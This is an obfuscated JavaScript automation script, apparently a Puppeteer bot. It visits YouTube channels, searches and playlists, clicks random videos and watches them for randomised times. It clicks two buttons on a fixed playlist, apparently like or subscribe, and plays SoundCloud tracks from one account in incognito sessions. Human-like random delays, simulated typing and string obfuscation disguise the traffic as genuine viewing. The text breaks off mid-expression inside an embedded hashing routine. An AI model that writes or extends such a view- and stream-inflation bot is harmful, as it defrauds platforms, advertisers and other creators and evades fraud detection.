const a0 = b,
  Z = d,
  Y = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1bd8 + -0x79 + 0x1c52))) + i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xb * -0x1cf + -0x3d * -0x4c + -0x2601);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x22c7 * -0x1 + 0x1d54 * -0x1 + 0x401b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9756 + 0x864c + -0xa872 + (0x57b1 + -0x2da1 * -0x2 + -0x785b) * random()) : await standardWaitForNetIdle(f), await wait(0x217c + 0x8b6 + -0xb55 * 0x2 + (0x1 * 0x359c + 0x1 * 0x1869 + -0x26f5) * random()), -0xe33 + -0x25cd + 0x3401;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xb * -0x1cf + -0x3d * -0x4c + -0x2601);
    let h = e[f];
    if (b['WUkhmy'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1954 + 0xb7f + 0x1 * 0xdd5, s, t, u = -0xb * -0x293 + -0x8e * -0x2 + -0x1d6d; t = n['charAt'](u++); ~t && (s = r % (-0xcf6 + -0x1dca + 0x2ac4) ? s * (0x26a6 * 0x1 + 0x226b + 0xa67 * -0x7) + t : t, r++ % (-0x1f7b + 0x432 * -0x3 + 0x2c15)) ? p += String['fromCharCode'](0x22b0 + 0x1 * -0x1565 + -0xc4c & s >> (-(-0x5a7 + 0x9 * 0x23d + 0x2 * -0x73e) * r & 0x25b0 + 0x862 + -0x2e0c)) : -0x1c4 + -0x218b + -0xbc5 * -0x3) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2 * -0x1cd + -0x123a + -0xaea * -0x2, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2209 * 0x1 + 0x213 * 0x1 + 0x2006))['slice'](-(0x1b1 + 0x1761 + -0x191 * 0x10));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3 * -0x61f + -0xc3 * 0x25 + 0x2e8c,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1c9 * -0x1 + -0x30 * -0x10 + -0x137; u < -0x2326 * 0x1 + -0xb1 * -0x8 + 0x1e9e; u++) {
          p[u] = u;
        }
        for (u = -0xd02 + 0xfb * -0x25 + 0x47b * 0xb; u < 0x5 * 0x3ad + 0x2 * -0x11f4 + 0x9 * 0x20f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x3 * 0xb1c + 0x1f7b + -0x1b * -0x1b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1498 + -0x627 * 0x1 + 0x1 * -0xe71, q = -0x1d65 + -0x1268 + -0x3 * -0xfef;
        for (let v = 0xa7 * 0x11 + 0x11 * 0x125 + -0x1e8c; v < n['length']; v++) {
          u = (u + (-0x9c4 + 0x22 * 0x2b + 0x40f)) % (0x3b2 + 0x63 * -0x27 + -0x97 * -0x15), q = (q + p[u]) % (0x185d * -0x1 + -0x1c5 * 0x2 + -0x97 * -0x31), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x25c9 + 0xee0 + -0x1 * -0x17e9)]);
        }
        return t;
      };
      b['NijBZN'] = m, c = arguments, b['WUkhmy'] = !![];
    }
    const j = e[-0x41d + 0x2 * 0x11a + 0x1e9],
      k = f + j,
      l = c[k];
    return !l ? (b['DeLPwZ'] === undefined && (b['DeLPwZ'] = !![]), h = b['NijBZN'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xb * -0x1cf + -0x3d * -0x4c + -0x2601);
    let h = e[f];
    if (c['mAoEej'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1954 + 0xb7f + 0x1 * 0xdd5, r, s, t = -0xb * -0x293 + -0x8e * -0x2 + -0x1d6d; s = m['charAt'](t++); ~s && (r = q % (-0xcf6 + -0x1dca + 0x2ac4) ? r * (0x26a6 * 0x1 + 0x226b + 0xa67 * -0x7) + s : s, q++ % (-0x1f7b + 0x432 * -0x3 + 0x2c15)) ? o += String['fromCharCode'](0x22b0 + 0x1 * -0x1565 + -0xc4c & r >> (-(-0x5a7 + 0x9 * 0x23d + 0x2 * -0x73e) * q & 0x25b0 + 0x862 + -0x2e0c)) : -0x1c4 + -0x218b + -0xbc5 * -0x3) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2 * -0x1cd + -0x123a + -0xaea * -0x2, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2209 * 0x1 + 0x213 * 0x1 + 0x2006))['slice'](-(0x1b1 + 0x1761 + -0x191 * 0x10));
        }
        return decodeURIComponent(p);
      };
      c['uHnYww'] = i, b = arguments, c['mAoEej'] = !![];
    }
    const j = e[0x3 * -0x61f + -0xc3 * 0x25 + 0x2e8c],
      k = f + j,
      l = b[k];
    return !l ? (h = c['uHnYww'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xabe + 0x1abb + 0x38b), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1799 + -0x12b2 * -0x1 + -0x2a4a;
}
async function randomWait() {
  return await wait(0x213 + 0x7ca * 0x1 + 0x9ab + (0x1b1 + 0x1761 + -0x2c5 * 0x2) * random()), 0x3 * -0x61f + -0xc3 * 0x25 + 0x2e8d;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1c9 * -0x1 + -0x30 * -0x10 + -0x137, -0x2326 * 0x1 + -0xb1 * -0x8 + 0x1da5), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x9c19 + 0x171 * -0x12e + 0x339c7 * 0x1) * getRandomInt(0x5 * 0x3ad + 0x2 * -0x11f4 + 0x1 * 0x1189, -0x3 * 0xb1c + 0x1f7b + -0xef * -0x2), h)), 0x1498 + -0x627 * 0x1 + 0x1c * -0x84;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1d65 + -0x1268 + -0x3 * -0xfef;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xa7 * 0x11 + 0x11 * 0x125 + -0x1e8b]['split']('\x20');
    for (let k = -0x9c4 + 0x22 * 0x2b + 0x40e; k < i['length']; k += 0x3b2 + 0x63 * -0x27 + -0xb65 * -0x1)
      j += i[k] * h[i[k + (0x185d * -0x1 + -0x1c5 * 0x2 + -0x5e * -0x4c)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const T = d,
      S = b,
      R = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l[R(0x5) + 'te']('class'))['slice'](-0x25c9 + 0xee0 + -0x39 * -0x67)['map'](l => Array[S(0x4, 'e)kQ')](l['children']))['flat'](-0x41d + 0x2 * 0x11a + 0x1ea)[T(0x7)](l => l['childNodes'][0x117c + -0x239 * 0xd + 0xb6a]['childNodes'][-0x113 * -0xb + -0x8a8 * 0x2 + 0x57f]['childNodes'][-0xf77 * -0x2 + -0x11e1 * -0x1 + -0x1 * 0x30ce]['childNodes'][-0x2674 + -0x151b + -0xc1 * -0x4f]['childNodes'][-0x14af + -0x994 + -0x791 * -0x4]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2437 + 0xb7a + 0x1ca5, 0xb40 + -0x1b59 + 0x23a1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1908 * 0x3 + -0x3 * 0xe4d + 0x1a67);
  const h = await getMaxTime(f),
    i = Math['min']((0x3 * 0x95e9 + -0x1 * -0x114fc + 0x1 * -0x1ec57) * getRandomInt(0xb9a * -0x1 + 0x378 + -0x209 * -0x4, -0x4fa + -0x43a + 0x939), h);
  return await wait(i), -0x1c4f + 0x22 + 0x1c2e;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const U = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me'](U(0x9) + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x2 * -0x5f0 + -0xd * 0x3b + -0x8e1]['children'][0x321 * -0x1 + -0x245 * 0x3 + 0xd4 * 0xc]['children'][0x31 * 0x44 + 0x16 * 0x18d + -0x2f22]['children'][-0x3f6 * -0x1 + 0x3e * -0x2f + 0x5 * 0x17c]['children'][-0x69 * 0x1 + -0x2349 + 0x23b2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x3 * -0xbb7 + -0x1 * -0x23cd + 0xb * -0x673;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x13 * 0x15c + 0x677 + 0xd * 0x185 + (0x4a3 * -0x3 + 0x5c * -0x59 + 0x2e17) * random()
  }), await wait(-0x2388 + 0x286 * -0x6 + 0x34a * 0x10 + (0x13 * -0x10 + 0x184d + -0x15f1 * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x2259 + 0x25a5 + 0x47fc * -0x1]['childNodes'][0x4af + 0x396 + 0x844 * -0x1]['childNodes'][-0x1 * -0x2b3 + -0x2225 * 0x1 + -0x1f73 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xb89 + 0xf43 * -0x1 + -0x7 * -0x89]['childNodes'][-0x1d6f + 0x26a3 + -0x934 * 0x1]['childNodes'][-0x1e39 + 0x1e9 * -0x9 + 0x2f6c]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xe * 0x9e + 0x10 * -0xce + 0xd9 * 0x5),
          r = -0x4 * -0x79a + -0x8a5 * -0x1 + -0x301 * 0xd;
        for (let u = -0x2 * 0xef8 + 0x4f9 * 0x4 + -0x4 * -0x283; u < q['length']; u += -0x52f + 0x7fd + -0x2cc)
          r += q[u] * k[q[u + (0x9b4 * -0x3 + 0x19 * 0xb8 + 0x9 * 0x13d)]];
        return r;
      }(n);
  });
  await wait((0x287 * 0x13 + 0x1 * 0x62f + 0x464) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1 * -0xfd5 + -0x3f * -0x703 + 0x3fd8 * -0x3) * getRandomInt(0x3 * -0xbfb + 0x2c5 + -0xb0f * -0x3, 0x233 * 0x1 + 0x2488 + -0x26b1), h + (-0xa74 * 0x3 + -0x2185 + 0x5469));
  return await wait(i), -0xd * 0x282 + -0x21e9 + 0x4284;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x16b6 * 0x1 + 0x784 + -0x35 * 0x92), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2113 * -0x1 + -0xbfd + -0x5c * -0x9e + (0x5 * 0x1ca + 0x8c9 + -0xdd3) * Math['random']());
    });
  }, -0x8b + 0x2024 + -0x441);
  await wait(-0x6adc * -0xe + 0x65 * 0xc16 + -0x608d6);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * -0x311b + 0x3 * -0x2302 + 0x1224b) * getRandomInt(-0x81c + 0x637 + 0x1e9, 0xf01 * 0x1 + 0x17c2 * -0x1 + 0x8da)), clearInterval(h), -0x1b48 + 0x21cd + -0x684;
}

function a() {
  const bl = [
    'uKjtsefingLxvq',
    'send',
    'y2XVC2u',
    'Ahr0Chm6lY9NCG',
    'WPXYW7RdVG',
    'z2v0qxr0CMLIDq',
    'rg/en/scri',
    'map',
    'xbrDZAFf3Q',
    'style-scop',
    'D1zUs0DtALKZAq',
    'qxjYyxLcDwzMzq',
    'eller/plea',
    'zufbzdvcBxPyEG',
    'WOWqxCkcW4jgW4iMfSkU',
    'thisisjimk',
    'BxvSDgLIB3GTCW',
    'vJvUtu9OstyYBW',
    '_Katana_+_',
    'qCkznfyudaSVW7fU',
    'D2vIlxnLy3vYAq',
    'WR/dVCkjWP9tl8komNjo'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function runYTModule(f, h) {
  const V = c,
    i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x29e + 0x98 * -0x3 + 0x466;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i[V(0x2)]();
    }
    if (j)
      return 0x169 * -0x6 + 0x1 * -0x534 + 0xdab;
    await randomWait();
  }
  return 0x768 * -0x5 + 0x18a3 + -0x211 * -0x6;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1fd4 + 0xb6a * 0x1 + 0x146a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd6f + 0x1ecd * -0x1 + 0x2c3c + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x39 * 0x47 + 0x5c1 * 0x5 + -0xcf6 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x8e5 + -0xa8e + 0x1a9;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x8e7a + -0x1 * -0x8971 + 0x1 * 0xb4d1 + getRandomInt(0x347c + -0x150 + -0x3b6 * -0x2, 0xbd * -0x77 + 0x1 * -0x4d39 + 0x11a44));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1510 + -0x7 * 0x36d + -0x22 * -0x16), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x330 * 0x6 + -0x1ae2 + 0x2e02;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x228f * -0x1 + -0x1 * -0x1d1d + -0x32f * 0x14, -0x1c81 * 0x1 + 0x120a * 0x1 + 0xaa9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xf45 * 0x2 + 0x23b0 + 0x2aa + floor((-0x1 * 0xf4d + 0x1 * 0x20b3 + 0x16 * -0x9d) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2 * 0x7c548488 + -0x84f97c2 + -0xfca * 0x71d9b),
          0x506590 + 0x1bb * 0x1f39 + -0x66d33,
          0x3b * 0x223 + 0xe63e + -0xe44f * 0x1,
          0x1636 + -0x261e + 0x1068
        ], y = [
          -0x36c + 0x1 * -0x9d1 + 0xd55 * 0x1,
          0x5 * -0x772 + -0x1 * -0xe7b + 0x16cf,
          0x1821 * 0x1 + 0x7af * -0x2 + 0x2e9 * -0x3,
          0x35 * 0x19 + 0xcb6 + 0xf1 * -0x13
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2576 + 0x99c + 0x1bdb)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x7 * -0x20d + 0x1c81 + 0x1 * -0xe26; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x251 * -0xb + 0x3 * 0xe8 + -0x1c33) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x10ce + 0x5 * 0x76 + -0x131c] = A[0x9a5 + 0x1581 + -0x1f16] = A[0x1 * 0xd56 + 0xf20 + -0x1c75] = A[0x2 * -0x64d + -0x26ba * -0x1 + -0x2 * 0xd0f] = A[0x10fc * 0x1 + -0xc5c + 0x49d * -0x1] = A[-0x6ad * -0x2 + -0x23d + -0xb19] = A[0x1ac8 + 0x115 * -0xa + -0xff1] = A[-0x1 * 0xe7d + 0x1825 + -0x9a2] = A[-0x221e + 0xbd8 + 0x76f * 0x3] = A[-0x133d + 0x76 * 0x4a + 0x1 * -0xed7] = A[-0x1 * 0x2675 + -0x42 * -0x29 + 0x1bec] = A[-0x3 * 0xc28 + 0x1 * 0x1cf4 + 0x78e] = A[0x3f + 0xde * -0xe + -0x8 * -0x17e] = A[-0x1 * -0x3e5 + -0x1395 * 0x1 + -0x2 * -0x7de] = A[0x1c82 + 0x2154 + -0x3dc9] = A[0x178b + 0x1e5d + -0x1aed * 0x2] = A[-0xb + 0x1298 + -0x127e] = 0x1 * -0x21f3 + -0x1 * 0x495 + 0x2688, this['blocks'] = A) : this['blocks'] = [
                -0x14 * 0xce + 0x1bf1 * 0x1 + -0xbd9,
                -0x3b5 + 0xa73 * 0x2 + -0x1131,
                -0x1ff1 + 0xeb * -0xb + 0x2a0a,
                -0x8 + -0x22fa + 0x2302,
                0x1a08 + -0x1 * -0x5f + 0x8cd * -0x3,
                -0x1 * 0xc11 + -0x253e + 0x3cb * 0xd,
                -0x1171 * -0x1 + -0xe30 + -0x341,
                -0x227 + 0x187 * -0x1 + 0x3ae,
                -0x2 * -0xa36 + 0x2566 * 0x1 + 0x39d2 * -0x1,
                0x1 * -0x1d13 + 0x1911 + 0x402,
                0x304 + 0x1d95 + -0x2099,
                0x1b1 * -0xc + -0x23d5 + 0x1 * 0x3821,
                0x1f2f + -0xeeb + -0x1044,
                -0x1 * -0x1abd + -0x192f + -0x18e,
                0x754 + -0x1010 + 0x8bc,
                -0x891 + -0x1 * 0x1ef1 + -0xd * -0x30a,
                0xd * 0x5b + 0x2bd * -0x5 + -0x2b * -0x36
              ], this['h0'] = 0x16764eb * 0x51 + -0x674c472d + 0x5cda7bd3, this['h1'] = -0x269d10 * -0x343 + -0xb6fe2eb9 * -0x1 + -0x4522ce60, this['h2'] = 0x11cc8af6 + 0xbdec5496 + -0x36fe028e, this['h3'] = -0x71ae9 * 0x416 + -0x1b * 0x12a343b + -0x1 * -0x4cadcab5, this['h4'] = 0x4607b72b + -0x22523e6b + 0xbb2a90 * 0xdb, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x2428 + -0x1 * -0x24a + 0x21de, this['finalized'] = this['hashed'] = 0x1c37 + -0x2469 + 0x832, this['first'] = 0x1538 + 0x5 * 0x5c + 0x2b * -0x89;
            }
            ['update'](J) {
              const W = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E[W(0xb) + 'r'] && (J = new Uint8Array(J)), M = 0x1a3 * 0x6 + -0x2326 * 0x1 + 0xcaa * 0x2, O = J['length'] || 0x42 * 0x5 + -0x1b46 + 0x19fc, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x10bd * -0x1 + -0x15c * 0x12 + 0x2935, P[0x215 * -0x3 + 0x1f69 + -0x192a] = this['block'], P[0x1 * -0x9f5 + -0x49 * 0x5f + 0x32 * 0xbe] = P[-0x1 * -0x2dd + -0xde3 + 0xb07] = P[0x1 * 0x1bef + -0xa * -0xdf + -0x24a3] = P[0x20bf + 0x253e + -0x45fa] = P[0x1 * 0x1ef6 + -0x11f8 + -0xcfa] = P[-0xfbe + 0xa23 + 0x5a0] = P[0xfcc + -0x2460 + 0x3 * 0x6de] = P[0x7 * -0x2bd + -0x1bda + -0x2f0c * -0x1] = P[0x5b1 + -0x510 + -0x99] = P[0x1d2d + 0x2311 + -0x4035] = P[-0x1 * 0x255e + -0x105b + 0x35c3 * 0x1] = P[-0x1 * 0x1149 + 0x1907 + 0x1b * -0x49] = P[0x2164 * -0x1 + -0xcb7 + 0x2e27] = P[0x1 * 0xf9a + -0xce1 + -0x24 * 0x13] = P[-0xde7 * 0x1 + 0xd9 * -0x2b + -0x4 * -0xc9a] = P[-0x547 + -0x5 * -0x7c9 + -0x2197] = -0x13d2 + -0xba9 + 0x1f7b), K) {
                    for (N = this['start']; M < O && N < -0x74c + -0x2479 * -0x1 + -0x1ced; ++M)
                      P[N >> 0x2 * 0x397 + -0x1b7c * -0x1 + -0x22a8] |= J[M] << y[0x3 * -0xb41 + 0x2 * 0x1 + -0x10e2 * -0x2 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x10a * -0xc + 0x399 + 0x91f; ++M)
                      (L = J['charCodeAt'](M)) < -0x12 * 0x131 + -0x1a08 + 0x2ffa ? P[N >> -0x25a3 + 0x8 + 0x259d] |= L << y[-0x5a4 + -0x1d56 + 0x22fd & N++] : L < -0x80 + 0x5 * 0x103 + -0x1 * -0x371 ? (P[N >> -0xa * -0xa4 + -0x681 + -0x1 * -0x1b] |= (-0xcd3 + 0x26df + 0x2 * -0xca6 | L >> 0xddf + -0x4 * -0x887 + -0x2ff5) << y[0x9 * 0x4f + -0x4 * -0x419 + -0x2 * 0x994 & N++], P[N >> 0x1af8 * 0x1 + 0xf1 * -0x3 + -0x1823] |= (0x2352 + 0x1f * -0xa + -0x219c | 0x1e2a + -0x15e1 + -0x80a & L) << y[0xc07 * 0x1 + 0xed5 * -0x2 + 0x11a6 & N++]) : L < -0x1854e + 0xdbe3 * -0x1 + -0x33931 * -0x1 || L >= -0x29 * 0x886 + 0xd * 0x1f7b + 0xa437 ? (P[N >> -0xb3 * 0x1f + -0x1 * 0x6fb + 0x1caa] |= (-0x68a + -0x239d * 0x1 + 0x1 * 0x2b07 | L >> -0x2273 * 0x1 + 0xf41 + 0x6 * 0x335) << y[-0x22bd + -0xf37 + 0x31f7 & N++], P[N >> 0xa5d + 0x1 * -0x13df + 0x4 * 0x261] |= (-0x59e + 0x8 * -0x86 + -0x2 * -0x527 | L >> 0x189 * -0x12 + -0xd9f * 0x1 + 0x2947 & 0x1901 + -0xe * 0x39 + 0x4 * -0x569) << y[0x2 * -0x117b + -0x1a21 * 0x1 + 0x2 * 0x1e8d & N++], P[N >> -0x1 * 0xed5 + 0x172 + 0xd65] |= (-0x5 * -0x316 + -0x2028 + -0x1ea * -0x9 | 0x2 * 0x23b + 0x25 * -0x8 + -0x30f & L) << y[-0x969 + 0x35 * 0x7 + 0x7f9 & N++]) : (L = 0x7 * -0x1177 + -0x16665 + 0x2e0a6 + ((0x1091 * 0x2 + -0x2181 + 0x45e & L) << 0x392 * 0x2 + -0x1636 + 0xf1c | -0x211 * 0x7 + -0x8f * 0xb + 0x189b & J['charCodeAt'](++M)), P[N >> 0x20b * -0xd + 0x14bd * -0x1 + -0xa * -0x4bb] |= (-0x117e * -0x1 + -0x107 * 0x17 + 0x1 * 0x713 | L >> 0x1e5c + -0x2303 + 0x27 * 0x1f) << y[-0x1 * -0x1d87 + -0x15ce + 0x5e * -0x15 